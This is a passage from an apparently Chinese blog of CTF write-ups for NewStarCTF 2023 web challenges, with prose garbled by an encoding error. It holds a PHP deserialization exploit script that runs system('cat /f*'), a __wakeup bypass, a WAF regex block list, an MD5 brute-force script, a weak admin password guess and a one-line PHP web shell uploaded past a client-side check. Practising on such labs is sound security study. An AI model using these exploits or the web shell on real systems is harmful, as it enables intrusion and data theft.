class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setPassword</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&quot;Ctfer&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘é¡ºç€åˆ†æå§ï¼Œæ„Ÿè§‰å€’ç€åˆ†ææ¯”å€’ç€åˆ†æè¦ç®€å•</p>
<p>:::warning no-icon</p>
<p><code>__invoke()</code>è§¦å‘æ¡ä»¶æ˜¯ï¼šå½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨å…¶æ‰€åœ¨çš„å¯¹è±¡æ—¶</p>
<p><code>__get()</code>è§¦å‘æ¡ä»¶æ˜¯ï¼šå½“è¯»å–ä¸€ä¸ªå¯¹è±¡ä¸­ä¸å¯è®¿é—®æˆ–è€…ä¸å­˜åœ¨çš„å±æ€§æ—¶</p>
<p><code>__call()</code>è§¦å‘æ¡ä»¶æ˜¯ï¼šå½“è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸å­˜åœ¨çš„å±æ€§æˆ–è€…ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶</p>
<p><code>__wakeup()</code>è§¦å‘æ¡ä»¶æ˜¯ï¼šå½“æ‰€åœ¨çš„å¯¹è±¡è¦è¢«ååºåˆ—åŒ–æ—¶</p>
<p><code>__sleep()</code>è§¦å‘æ¡ä»¶æ˜¯ï¼šå½“æ‰€åœ¨çš„å¯¹è±¡è¦è¢«åºåˆ—åŒ–æ—¶</p>
<p>:::</p>
<p>é¦–å…ˆï¼Œsorryç±»æœ‰<code>__destruct()</code>ï¼Œå…¥å£åœ¨è¿™é‡Œ</p>
<p>ç”±äºé¢˜ç›®äº‹å…ˆè®¾ç½®äº†ä¸€ä¸ªéšæœºå¯†ç ï¼Œå¯ä»¥ç”¨å–åœ°å€&amp;ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setPassword</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()));</span><br></pre></td></tr></table></figure>

<p>ç„¶åhintæ˜¯echoå‡ºæ¥çš„ï¼Œæ°å¥½showç±»ä¸­æœ‰<code>__toString()</code>ï¼Œå°±é¡ºç€å®ƒèµ°äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨äº†<code>show()</code>ï¼Œsecret_codeç±»æœ‰è¿™ä¸ªå‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>==å…¶å®showç±»ä¹Ÿæœ‰ï¼Œåªä¸è¿‡ä»–æ²¡å•¥ç”¨æ’’:happy:==</p>
<p>ä½†æ˜¯å…¶ä»–ç±»ä¸­æ²¡æœ‰secretè¿™ä¸ªå˜é‡ï¼Œæœ‰ä¹Ÿåªæ˜¯functionï¼ŒçŒœæµ‹è¿™ä¸ªæ—¶å€™å°±æ˜¯è¦ç”¨åˆ°<code>__get()</code>äº†ï¼Œäºæ˜¯è°ƒåˆ°sorryç±»</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡ŒæŠŠ$nameå½“æˆå‡½æ•°è°ƒç”¨äº†ï¼Œé‚£å°±æ˜¯<code>__invoke()</code>äº†ï¼Œè·³è½¬åˆ°fineç±»</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„åˆ°è¿™é‡Œæœ‰<code>__wakeup()</code>ï¼Œæ‰€ä»¥åœ¨åºåˆ—åŒ–ä¹‹åè¿˜è¦ç»•è¿‡å®ƒï¼Œæ”¹ä¸ªå‚æ•°å°±å¥½äº†ï¼Œæ¯”å¦‚å¯¹è±¡ä¸ªæ•°å•¥çš„</p>
<p>popé“¾å¦‚ä¸‹ï¼š</p>
<p>sorry::destruct() -&gt; show::toString()-&gt;secret_show::show()-&gt;sorry::get()-&gt;fine::invoke()</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = &amp;<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;key = <span class="keyword">new</span> <span class="title function_ invoke__">fine</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;cat /f*&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;ctf = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;hint = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;fine\&quot;:2&quot;</span>,<span class="string">&quot;fine\&quot;:3&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>

<p>:::warning</p>
<p>è¿™é‡Œä¸èƒ½ç›´æ¥ç”¨åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æ˜¯å› ä¸ºåœ¨phpä¸­ï¼Œå±æ€§ä¸ºprotectedå’Œprivateçš„å˜é‡åœ¨åºåˆ—åŒ–ä¹‹åç»è¿‡urlç¼–ç æ—¶ä¼šè¢«åŠ ä¸Šä¸å¯è§å­—ç¬¦ï¼Œå¯ä»¥å»æœä¸€æœï¼Œç½‘ä¸ŠæŒºå¤šæ–‡ç« çš„ã€‚ä¸è¿‡å…»æˆä¹ æƒ¯ï¼Œè¿˜æ˜¯æœ€å¥½éƒ½ç”¨urlç¼–ç åçš„å­—ç¬¦ä¸²äº¤ä¸Šå»</p>
<p>:::</p>
<h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]R!C!E!"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]R!C!E!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>ä»£ç é€»è¾‘å¾ˆç®€å•ï¼Œéæ³•ä¼ å‚å’Œmd5ç¢°æ’ç½¢äº†</p>
<p>MD5è¿™é‡Œå¯ä»¥ç›´æ¥çˆ†ç ´</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">str1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">500000</span>):</span><br><span class="line">        <span class="keyword">if</span> (hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&quot;UTF-8&quot;</span>)).hexdigest())[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&quot;c4d038&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">decode(<span class="string">&quot;c4d038&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>çˆ†ç ´å‡ºæ¥æ˜¯114514</p>
<h3 id="éæ³•ä¼ å‚"><a href="#éæ³•ä¼ å‚" class="headerlink" title="éæ³•ä¼ å‚"></a>éæ³•ä¼ å‚</h3><p>åœ¨phpç‰ˆæœ¬å°äº8æ—¶ï¼Œphpå¤„ç†åå­—å¸¦æœ‰<code>.</code>ã€<code>ç©ºæ ¼</code>ã€<code>[</code>ã€<code>]</code>ç­‰ç¬¦å·çš„å˜é‡åæ—¶ï¼Œä¼šå°†ç¬¬ä¸€ä¸ªç¬¦å·è½¬åŒ–ä¸ºä¸‹åˆ’çº¿<code>_</code>ï¼Œä½†æ˜¯ä¸ä¼šæ”¹å˜åç»­çš„ç¬¦å·</p>
<p>phpç‰ˆæœ¬å¤§äº8æ—¶ï¼Œphpä¼šå°†æ‰€æœ‰ç¬¦å·è½¬åŒ–ä¸ºä¸‹åˆ’çº¿<code>_</code></p>
<p>è¿™é‡Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“phpç‰ˆæœ¬ï¼Œä½†æ˜¯æ ¹æ®å˜é‡åå¯ä»¥çŒœæµ‹phpç‰ˆæœ¬ä¸º7.xï¼Œå› ä¸ºæˆ‘ä»¬ç›®æ ‡çš„å˜é‡åæ˜¯<code>e_v.a.l</code>ï¼Œå¦‚æœphpç‰ˆæœ¬å¤§äº8ï¼Œé‚£ä¹ˆåœ¨è½¬æ¢çš„æ—¶å€™ä¼šå°†å˜é‡åçš„ç¬¦å·å…¨éƒ¨è½¬æ¢ä¸º<code>_</code>ï¼Œè¿™æ ·ä¼šå¯¼è‡´å˜é‡åä¸ä¸€è‡´è€Œå¯¼è‡´ä¼ å‚å¤±è´¥</p>
<p>è¿™é‡Œåœ¨POSTæ—¶ä¼ åå­—e[.v.a.l</p>
<img src="/2024/03/20/buuctf/buu/image-20240325185300017.png" class="" title="image-20240325185300017">

<p>è¿™é‡Œçš„wafç›¸å½“äºä¸€ä¸ªçº¸è€è™ï¼Œæ‰§è¡Œå‘½ä»¤tac /f*å³å¯ï¼ˆä¸ç¡®å®šçš„å¯ä»¥ç”¨findå‡½æ•°ï¼‰</p>
<img src="/2024/03/20/buuctf/buu/image-20240325185401554.png" class="" title="image-20240325185401554">

<p>ç”¨findæŸ¥æ‰¾flagç»“æœå¦‚ä¸‹ï¼š</p>
<img src="/2024/03/20/buuctf/buu/image-20240325185500177.png" class="" title="image-20240325185500177">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags </span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS0/flags </span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags </span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags </span><br><span class="line">/sys/devices/virtio-mmio-cmdline/virtio-mmio.3/virtio3/net/eth0/flags </span><br><span class="line">/sys/devices/virtual/net/lo/flags </span><br><span class="line">/usr/include/linux/flat.h </span><br><span class="line">/flag</span><br></pre></td></tr></table></figure>

<h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-EasyLogin"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-EasyLogin" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]EasyLogin"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]EasyLogin</h2><p>æ‰“å¼€ç™»å½•ç•Œé¢ï¼Œå‘ç°å¹¶æ²¡æœ‰æ³¨å…¥ç‚¹ï¼Œæ­£å¸¸æ³¨å†Œç™»å½•å°±è¡Œ</p>
<img src="/2024/03/20/buuctf/buu/image-20240325185834612.png" class="" title="image-20240325185834612">

<p>è¿™é‡Œå‡ºé¢˜äººåšäº†ä¸€ä¸ªshellï¼Œå¼€å§‹æ—¶æˆ‘ä»¬è¿›å…¥çš„æ˜¯ä¸€ä¸ªèŠå¤©ç¨‹åºï¼Œä½ å‘ä»€ä¹ˆå®ƒå›ä½ ä»€ä¹ˆ</p>
<p>Ctrl+Dé€€å‡ºç¨‹åº</p>
<p>ç»è¿‡æœç´¢å‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„</p>
<img src="/2024/03/20/buuctf/buu/image-20240325190108100.png" class="" title="image-20240325190108100">

<p>å¹¶ä¸”binä¸­å°±è¿™å‡ ä¸ªå‘½ä»¤ï¼Œä¸”æ ¹ç›®å½•åªæœ‰binå’Œhome</p>
<p>æœ‰ç‚¹ä¸€ç­¹è«å±•äº†</p>
<p>æŠ“ä¸ªåŒ…çœ‹çœ‹ç™»å½•ç•Œé¢</p>
<p>åœ¨å‘åŒ…æ—¶æ³¨æ„åˆ°æœ‰ä¸€ä¸ª/passportåŒ…</p>
<img src="/2024/03/20/buuctf/buu/image-20240325190521852.png" class="" title="image-20240325190521852">

<p>é‡Œé¢ä¼¼ä¹æœ‰flagï¼Œä½†æˆ‘ä»¬çœ‹ä¸åˆ°</p>
<p>å¯èƒ½æ˜¯æƒé™é—®é¢˜ï¼Ÿä¹Ÿåªèƒ½çŒœçŒœ</p>
<p>ä¹‹å‰åœ¨æ³¨å†Œæ—¶å‘ç°adminè¢«æ³¨å†Œäº†ï¼Œè¯•è¯•èƒ½ä¸èƒ½ç”¨å¼±å¯†ç </p>
<p>å‘ç°èƒ½æˆåŠŸï¼Œå¯†ç æ˜¯000000</p>
<p>å†é‡æ–°æŠ“åŒ…</p>
<p>302è·³è½¬ï¼Œå¾—åˆ°flag</p>
<img src="/2024/03/20/buuctf/buu/image-20240325190833774.png" class="" title="image-20240325190833774">

<h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-HTTP"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-HTTP" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of HTTP"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of HTTP</h2><p>è¿™é‡Œå°±ä¸å¤šè¯´äº†ï¼Œhttpå¤´çš„æœ‰å…³æè¿°åœ¨<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept">å®˜æ–¹æ¡£æ¡ˆ</a>é‡Œï¼Œæ”¾æ“ä½œ</p>
<img src="/2024/03/20/buuctf/buu/image-20240325191241817.png" class="" title="image-20240325191241817">

<p>secretçœ‹æºä»£ç </p>
<img src="/2024/03/20/buuctf/buu/image-20240325191403306.png" class="" title="image-20240325191403306">

<img src="/2024/03/20/buuctf/buu/image-20240325191613796.png" class="" title="image-20240325191613796">

<img src="/2024/03/20/buuctf/buu/image-20240325191835373.png" class="" title="image-20240325191835373">

<img src="/2024/03/20/buuctf/buu/image-20240325191935035.png" class="" title="image-20240325191935035">

<img src="/2024/03/20/buuctf/buu/image-20240325192411163.png" class="" title="image-20240325192411163">

<h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-Upload"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-Upload" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of Upload"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of Upload</h2><p>ä¸€é“æœ´å®æ— åçš„æ–‡ä»¶ä¸Šä¼ ï¼Œæ­¥éª¤æ— éå°±æ˜¯ï¼šå†™:horse:ï¼ŒæŠ“åŒ…ï¼Œæ”¹åç¼€ç»•è¿‡ï¼Œè®¿é—®æ–‡ä»¶ï¼ŒRCE</p>
<img src="/2024/03/20/buuctf/buu/image-20240326122050719.png" class="" title="image-20240326122050719">

<p>è¿™é‡Œè¯´ä¸€ä¸‹æˆ‘ä¸ºä»€ä¹ˆä¼ phpä¼šæˆåŠŸ</p>
<p>å¯ä»¥åˆ†ææºç </p>
<img src="/2024/03/20/buuctf/buu/image-20240326122137513.png" class="" title="image-20240326122137513">

<p>è¿™é‡Œè¿™é‡Œçš„æ£€æŸ¥ä½äºå‰ç«¯ï¼Œç”¨jså†™æˆçš„ï¼Œæˆ‘ä»¬ç”¨ç«ç‹çš„æ’ä»¶Javascript Switcherç›´æ¥æŠŠjsç»™banäº†å°±è¡Œï¼Œè¿™æ ·å°±ä¸ä¼šè¿‡æ»¤äº†</p>
<p>:::warning</p>
<p>æœ‰çš„æ—¶å€™ï¼Œæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ä¹Ÿä¼šç”¨jsç¼–å†™ï¼Œæ‰€ä»¥è¿™ç§å·¥å…·åœ¨ä½¿ç”¨æ—¶è¦å…·ä½“æƒ…å†µå…·ä½“åˆ†æ</p>
<p>:::</p>
<p>:horse:çš„è·¯å¾„æœ‰äº†ï¼Œå¯ç›´æ¥è®¿é—®</p>
<img src="/2024/03/20/buuctf/buu/image-20240326122542130.png" class="" title="image-20240326122542130">

<p>æˆ‘è¿™é‡Œå†™:horse:æ˜¯<code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code></p>
<h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-PHP"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-PHP" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of PHP"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯ä»¥çˆ†ç ´ï¼Œä¹Ÿå¯ä»¥æ•°ç»„ç»•è¿‡</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 1=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$flag1</span> = True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯ä»¥æ•°ç»„ç»•è¿‡ï¼Œå…·ä½“åŸå› å¯ä»¥å»æœæœ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span 